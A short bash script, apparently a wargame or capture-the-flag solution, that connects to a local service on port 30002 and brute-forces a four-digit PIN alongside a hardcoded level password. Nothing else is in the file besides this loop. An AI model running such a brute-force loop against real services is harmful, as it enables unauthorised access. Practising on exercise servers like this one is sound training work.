#!/bin/bash

PORT=30002
TARGET="localhost"
PASS="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

# Open a connection to the server and keep it open
exec 3<>/dev/tcp/$TARGET/$PORT

if [ $? -ne 0 ]
then
    echo "Connection failed"
    exit 1
fi

sleep 1
read -r crap <&3
echo $crap

for i in {0000..9999}
do
    # Send the password and pincode to the server
    echo "$PASS $i" >&3  

   # Read the server's response
    read -r response <&3

    # Check if the response contains the word "Wrong!"
    if [[ $response != *"Wrong!"* ]]
    then
        echo "Successful attempt with pince: $i"
        echo $response
        break
    else 
        echo "Failed attempt with pincode: $i"
    fi

done 

# Close the connection
exec 3<&-
exec 3>&-

